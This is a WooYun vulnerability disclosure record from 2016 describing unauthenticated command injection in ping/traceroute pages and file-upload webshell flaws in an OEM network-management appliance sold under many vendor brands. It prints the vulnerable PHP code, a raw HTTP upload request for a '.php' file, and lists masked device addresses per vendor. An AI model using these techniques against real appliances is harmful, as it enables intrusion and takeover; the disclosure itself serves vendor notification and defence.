{"id": 88412, "wybug_id": "wooyun-2016-0192732", "wybug_title": "某OEM产品设备任意四处任意命令及getshell(涉及天融信/锐捷/任子行/中科网威/D-Link等10多家厂商)                                      ", "wybug_corp": "OEM", "wybug_author": "YY-2012", "wybug_date": "2016-04-05 17:50", "wybug_open_date": "2016-07-06 08:40", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-10：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-06-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-06-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-07-06：\t细节向公众公开  简要描述： rt 详细说明：  上海冰峰计算机网络技术有限公司冰峰上网行为管理设备/NP10501000M/**.**.**.**:9090/#**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:9090/\n\nNP上网行为管理**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:8090/**.**.**.**:9090/**.**.**.**:9090/\n\nGIS上网行为管理设备**.**.**.**:8080/**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:9090/\n\n天融信某上网行为管理设备**.**.**.**/**.**.**.**:8888/**.**.**.**/**.**.**.**/**.**.**.**:10000/https://**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**:4433/**.**.**.**/**.**.**.**/\n\nD-Link上网行为管理设备**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:9090/\n\n福建海峡信息技术有限公司黑盾安全审计系统**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:9090/https://**.**.**.**:9090/**.**.**.**:9090/\n\nRG-UAC锐捷统一上网行为管理与审计设备**.**.**.**/**.**.**.**:8089/**.**.**.**:8089/**.**.**.**/**.**.**.**/\n\n深圳奥联信息安全技术有限公司审计设备**.**.**.**/**.**.**.**:9090/**.**.**.**/**.**.**.**:9090/**.**.**.**:9090/\n\n台湾公司：IDMART奕銓科技-網路監控/流量控管/負載平衡/攻擊防護/次世代防火牆**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:9090/\n\n华信运维安全管理系统v2.0**.**.**.**:9090/**.**.**.**:9090/\n\n任天行网络安全管理系统(SURF-RAG)**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**:4433/**.**.**.**/\n\n中科网威安全网关**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:9090/\n\n中科网优网络行为管理系统https://**.**.**.**:9090/login.phphttps://**.**.**.**:9090/https://**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:9090/\n\n胜鑫塔上网行为管理**.**.**.**:9090/**.**.**.**:9090/\n\n南京清华永新网络科技有限公司**.**.**.**:9090/\n\nNeusoft东软**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:9090/\n\nAisino航天信息股份网络审计管控系统**.**.**.**:9090/login.php**.**.**.**/\n\n登陆界面无标识：**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:9090/**.**.**.**:9090/\n\n   漏洞证明：  两处任意命令执行无需登录：第一处：\nif(key_exists(\"text_target\", $_GET)\t\t&& key_exists(\"text_pingcount\", $_GET)\t\t&& key_exists(\"text_packetsize\", $_GET)){\t$text_target = $_GET[\"text_target\"];\t$text_pingcount = $_GET[\"text_pingcount\"];\t$text_packetsize = $_GET[\"text_packetsize\"];\t$pingcmd = sprintf(\"ping %s -c %s -s %s\", $text_target, $text_pingcount, $text_packetsize);\texec($pingcmd, $lines);\n/view/systemConfig/systemTool/ping/ping.php\n\n第二处：\n$text_target = $_GET[\"text_target\"];\t$text_ageout = $_GET[\"text_ageout\"];\t$text_minttl = $_GET[\"text_minttl\"];\t$text_maxttl = $_GET[\"text_maxttl\"];\t$traceroutecmd = sprintf(\"traceroute %s -f %s -m %s -w %s -q 1\", $text_target, $text_minttl, $text_maxttl, $text_ageout);\texec($traceroutecmd, $lines);\t$rettraceroutecmd .= _gettext(\"testing_wait\").chr(10).chr(10);\n/view/systemConfig/systemTool/traceRoute/traceroute.php利用方式同上。两处命令执行需登录：第一处：/view/IPV6/ipv6networktool/ping/ping.php\nif(key_exists(\"text_target\", $_GET)\t\t&& key_exists(\"text_pingcount\", $_GET)\t\t&& key_exists(\"text_packetsize\", $_GET)){\t\t$text_target6 = $_GET[\"text_target\"];\t$text_pingcount6 = $_GET[\"text_pingcount\"];\t$text_packetsize6 = $_GET[\"text_packetsize\"];\t$pingcmd = sprintf(\"ping -c %s -s %s %s\", $text_pingcount6, $text_packetsize6, $text_target6);\texec($pingcmd, $lines);\t$retpingcmd6 .= _gettext(\"testing_wait\").chr(10).chr(10);\n\n\n第二处：/view/IPV6/ipv6networktool/traceroute/traceroute.php\n$text_target = $_GET[\"text_target\"];\t$text_ageout = $_GET[\"text_ageout\"];\t$text_minttl = $_GET[\"text_minttl\"];\t$text_maxttl = $_GET[\"text_maxttl\"];\t\t$traceroutecmd = sprintf(\"traceroute6 -6 -f %s -m %s -w %s %s\", $text_minttl, $text_maxttl, $text_ageout, $text_target);\texec($traceroutecmd, $lines);\t$rettraceroutecmd .= _gettext(\"testing_wait\").chr(10).chr(10);\n利用方式同上。三处任意文件上传getshell需登录：第一处：\\view\\userAuthentication\\userDefined\\upload.php\n<?php$page_name = 'AuthenticationOptions';include_once($_SERVER[\"DOCUMENT_ROOT\"].\"/authenticed_writable.php\");//身份认证?><!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://**.**.**.**/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><html xmlns=\"http://**.**.**.**/1999/xhtml\"><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /><link href=\"/css/skin.css\" rel=\"stylesheet\" type=\"text/css\" /><script type=\"text/javascript\" src=\"/js/prototype.js\"></script><script type=\"text/javascript\" src=\"/js/base.js\"></script></head><body><?phpfunction upload($file,$dir,$name){$max_size=1024000; //500 KB $max_w = 8800; //最大宽度800像素$max_h = 8600; //最大高度600像素$min_w = 10; //最小宽度400像素$min_h = 10; //最小高度300像素if($dir) //如果路径不是以\"/\"结尾则加上\"/\"{    if(substr($dir,-1)!=\"/\")     $dir=$dir.\"/\"; }if($name==\"\")$name=$_FILES[\"$file\"][name];$len=strrpos($name,\".\"); //取得主文件名长度if(!$len)$len=strlen($name);$name=substr($name,0,$len); //取得主文件名//添加扩展名if($_FILES[\"$file\"][type]==\"image/gif\")$name=$name.\".gif\";if($_FILES[\"$file\"][type]==\"image/pjpeg\")$name=$name.\".jpg\";if($_FILES[\"$file\"][type]==\"image/jpeg\")$name=$name.\".jpg\";if($_FILES[\"$file\"][type]==\"image/x-png\")$name=$name.\".png\";//检查上传过程中是否出现错误if($_FILES[\"$file\"][error]) //当发生错误时{    if(($_FILES[\"$file\"][error]==1)||($_FILES[\"$file\"][error]==2))     $info=_gettext('uploadFail');    if($_FILES[\"$file\"][error] ==3)    $info=_gettext('uploadFail');    if($_FILES[\"$file\"][error] ==4)    $info=_gettext('uploadFail');    if($_FILES[\"$file\"][error] ==5)    $info=_gettext('uploadFail');}else //当上传成功时{    if(($_FILES[\"$file\"][type]==\"image/gif\")||($_FILES[\"$file\"][type]==\"image/pjpeg\")||($_FILES[\"$file\"][type]==\"image/x-png\")||($_FILES[\"$file\"][type]==\"image/jpeg\")) //是合法的文件类型时    {        if($_FILES[\"$file\"][size]<=$max_size) //检查文件大小        {            $size=GetImageSize($_FILES[\"$file\"][tmp_name]);             if(($size[0]<=$max_w)&&($size[0]>=$min_w)&&($size[1]<=$max_h)&&($size[1]>=$min_h)) //检查图片的长宽            {                //复制文件到指定位置。                copy($_FILES[\"$file\"][tmp_name],$dir.$name); //复制文件，并改名                if(file_exists($dir.$name))  //检查是否上传成功\t\t{\t\t\t$cmd = \"mkdir /home/config/default/Image/\";\t\t\texec($cmd);\t\t\tcopy($_FILES[\"$file\"][tmp_name],\"/home/config/default/Image/\".$name); //复制文件，并改名\t\t\t$info=_gettext('uploadSuccess');\t\t}                else                \t$info=_gettext('uploadFail');            }            else //图片尺寸不合适时            {                $info=_gettext('uploadFail_image_size_error');            }            }        else //文件超出限制时        {           $info=_gettext('uploadFail_file_too_big');         }    }    else //文件类型非法时    {    \t$info=_gettext('uploadFail_file_type_error');    } }return \"$info\";}$info = upload(\"upImage\",\"/var/www/auth/images/\",\"\")?><script language=\"javascript\" type=\"text/javascript\">\talert(\"<?php echo $info;?>\");\twindow.location.href=\"list.php\";</script></body></html>\n第二处：\\view\\systemObject\\certificateAdmin\\sslLib\\upload.php\n<?php$page_name = 'm_certification';\tinclude_once($_SERVER[\"DOCUMENT_ROOT\"].\"/authenticed_writable.php\");//ʭ·ވЖ¤\t//include_once(\"E:/ag380-wp/page/nm/model/common_fun.php\");\t$certDir = '/usr/local/squid/var/temp/';\t$result = -1;\tfunction upload(&$errorInfo)\t{\t\tglobal $certDir;\t\tglobal $result;\t\t$upfilename = 'file';\t\t$file = $_FILES[$upfilename];\t\t\t\tif($_FILES[$upfilename]['error'] != 0)\t\t{\t\t\t$errorInfo = _gettext('fail').'('.$_FILES[$upfilename]['error'].')';\t\t\treturn false;\t\t}\t\t$tmp_name=$file[\"tmp_name\"];\t\t\t\tif(!is_uploaded_file($tmp_name))\t\t{\t\t\t$errorInfo = _gettext('tmp file error');\t\t\treturn false;\t\t}\t\t$destination = $certDir.$file[\"name\"];\t\t\tif(!file_exists($certDir))\t\t\tmkdir($certDir);\t\t\t\tif(!move_uploaded_file ($tmp_name, $destination))\t\t{\t\t\t$errorInfo =  _gettext('movefail');\t\t\treturn false;\t\t}\t\t\t$result = load_ssl_certs($destination);\t\t eturn true;\t}\t\t\t\t\tif($_REQUEST)\t{\t\tforeach ($_REQUEST as $key=>&$value)\t\t{\t\t\tif(!is_array($value))\t\t\t\t$value = stripslashes((trim($value)));\t\t}\t}\t\t\t\tif ( $_FILES['file']['name']!= '')\t{\t\tupload($reMsg);\t\t\t$reMsg1 =\"error\";\t}\t\t\t\t\t\t?><!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://**.**.**.**/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><html xmlns=\"http://**.**.**.**/1999/xhtml\"><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /><title>Ϟ±덢τµµ</title><link href=\"/css/skin.css\" rel=\"stylesheet\" type=\"text/css\" /><script type=\"text/javascript\" src=\"/js/prototype.js\"></script><script type=\"text/javascript\" src=\"/js/base.js\"></script><script type=\"text/javascript\"><?php\tif( $result != 0 )\t\techo \"alert('\".$reMsg1.\"!');\";?>\tlocation.href = 'list.php';</script></head><body></body></html>\n上面两处利用方式：\nPOST /view/systemObject/certificateAdmin/sslLib/upload.php HTTP/1.1Accept: text/html, application/xhtml+xml, */*Accept-Language: zh-CNUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like GeckoContent-Type: multipart/form-data; boundary=---------------------------7e0313222035cUA-CPU: AMD64Accept-Encoding: gzip, deflateHost: **.**.**.**:9090Content-Length: 203Pragma: no-cacheCookie: PHPSESSID=Connection: close-----------------------------7e0313222035cContent-Disposition: form-data; name=\"file\"; filename=\"1.php\"Content-Type: image/jpegtest-----------------------------7e0313222035c--\n第三处：/view/fireWall/securityPolicy/upload.php\n<?php$page_name = 'm_secpolicy';include_once($_SERVER[\"DOCUMENT_ROOT\"].\"/authenticed_writable.php\");require_once(\"../../../model/File.php\");print_r($_POST);$upload = new UploadFile(\"/var/www/html/upload\",'',2*1024);$upload->run('security_policy_file');print_r($upload->get_info());?>\n\n\n   修复方案：  联系厂商   版权声明：转载请注明来源 YY-2012@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2016-04-07 08:34 厂商回复： CNVD确认所述情况,根据测试涉及的设备生产厂商,首先通知CNVD成员单位,后续尝试一一通知国内外相关厂商.对于厂商处置情况,CNVD重点监督成员单位做好设备用户方的主动修复工作.rank 40+. 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-04-05 17:51 |    \t\t带头大哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:885 漏洞数:266        | |任意邮件伪造| |目录遍历| |任意文件读取|...)\t\t \n  就说怎么能没有你发的漏洞呢......我实在找不动了...找到的也是案例不足...    \n     2016-04-11 09:44 |    \t\t开心一下1313 \t\t\t( 实习白帽子  |\t\t\t        Rank:77 漏洞数:27        | 喝口水,压压惊......)\t\t \n  rank 40+    \n     2016-04-11 17:55 |    \t\t未了 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        )\t\t \n  40+++++++++++++++++++    \n     2016-04-11 18:15 |    \t\tMark0smith \t\t\t( 普通白帽子  |\t\t\t        Rank:178 漏洞数:72        )\t\t \n  6    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}